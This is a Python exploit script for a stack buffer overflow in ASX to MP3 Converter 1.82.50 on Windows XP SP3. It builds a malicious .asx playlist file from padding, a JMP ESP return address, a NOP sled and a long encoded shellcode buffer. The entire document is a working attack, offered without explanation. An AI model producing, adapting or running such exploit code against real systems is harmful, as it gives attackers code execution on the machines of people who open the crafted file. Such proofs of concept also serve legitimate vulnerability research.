'''
# Exploit Title: ASX to MP3 Converter 1.82.50 Stack Overflow
# Date: 2 Oct 2015
# Exploit Author: ex_ptr
# Vendor Homepage: http://mini-stream.net
# Version: 1.82.50
# Tested on: Windows XP SP3
'''

#import struct
filename = "exploitPY.asx"

dummy = "A" * 249 # new offest
#dummy = "A"*0x104

EIP   = "\x9d\x78\x03\x10" # new JMP ESP  : 1003789D
#EIP   = struct.pack('<I', 0x76af3adc)

#FFFF  = "\xFF\xFF\xFF\xFF"
NOP   = "\x90" * 32


buf =  b""
buf += b"\xba\x34\xa1\x11\xf5\xda\xd8\xd9\x74\x24\xf4\x5e\x33"
buf += b"\xc9\xb1\x52\x83\xc6\x04\x31\x56\x10\x03\x56\x10\xd6"
buf += b"\x54\xed\x1d\x99\x97\x0e\xde\xc5\x1e\xeb\xef\xd7\x45"
buf += b"\x7f\x5d\xe7\x0e\x2d\x6e\x8c\x43\xc6\x5f\x6d\x6c\x51"
buf += b"\xd5\xb7\xf8\xef\xc2\x86\x3e\xa3\x2f\x89\xc2\xbe\x63"
buf += b"\x69\xfa\x70\x76\x68\x3b\xc7\xfc\x85\x91\x8f\x75\x0b"
buf += b"\x06\xbb\xc8\x97\x27\x6b\x47\xa7\x5f\x0e\x98\x53\xec"
buf += b"\x11\xc9\x10\xb4\x31\xe8\xf5\x15\xb9\xa2\xe1\x10\x74"
buf += b"\x46\x2d\x52\xb6\x58\xc6\x50\x33\xa7\x0e\xa9\x83\x69"
buf += b"\x61\xc7\xaf\x6b\xba\xe0\x4f\x1e\xb0\x12\xed\x19\x03"
buf += b"\x68\x29\xaf\x93\xca\xba\x17\x77\xea\x6f\xc1\xfc\xe0"
buf += b"\xc4\x85\x5a\xe5\xdb\x4a\xd1\x11\x57\x6d\x35\x90\x23"
buf += b"\x4a\x91\xf8\xf0\xf3\x80\xa4\x57\x0b\xd2\x01\x07\xa9"
buf += b"\x99\xa0\x5e\xcd\x62\x3b\x5f\x93\xf4\xf7\x92\x2c\x04"
buf += b"\x90\xa5\x5f\x36\x3f\x1e\xc8\x7a\xc8\xb8\x0f\x7d\xe3"
buf += b"\x7d\x9f\x80\x0c\x7e\x89\x46\x58\x2e\xa1\x6f\xe1\xa5"
buf += b"\x31\x90\x34\x53\x39\x37\xe7\x46\xc0\xad\x06\xed\x39"
buf += b"\x59\xe3\xfe\xe2\x79\x0c\xd5\x8a\x11\xf1\xd6\xa5\xbd"
buf += b"\x7c\x30\xaf\x2d\x29\xea\x58\x8f\x0e\x23\xfe\xf0\x64"
buf += b"\xc9\xc0\x01\x02\x8a\xc0\x1d\x0c\x7c\xa9\xaa\xe5\xba"
buf += b"\xd6\x2b\x20\xed\x40\xa7\x27\x29\x70\xb8\x6d\x19\xe5"
buf += b"\x2e\xfb\xc8\x44\xcf\xfc\xc0\x3d\x0f\x69\xef\x97\x58"
buf += b"\x05\xed\xce\xae\x8a\x0e\x25\xad\xcd\xf1\xb8\x9c\xa6"
buf += b"\xc4\x2e\x9e\xd0\x28\xbf\x1e\x21\x7f\xd5\x1e\x49\x27"
buf += b"\x8d\x4d\x6c\x28\x18\xe2\x3d\xbd\xa3\x52\x91\x16\xcc"
buf += b"\x58\xcc\x51\x53\xa3\x3b\xe2\x94\x5b\xba\xe2\x65\x98"
buf += b"\x6b\x2b\x10\xf7\xaf\x08\x2b\xb2\x92\x39\xa6\xbc\x81"
buf += b"\x3a\xe3"


exploit = dummy + EIP + NOP + buf
#exploit = dummy + EIP + FFFF + NOP + Shell

f = open(filename,'wb')
f.write(exploit)
f.close()
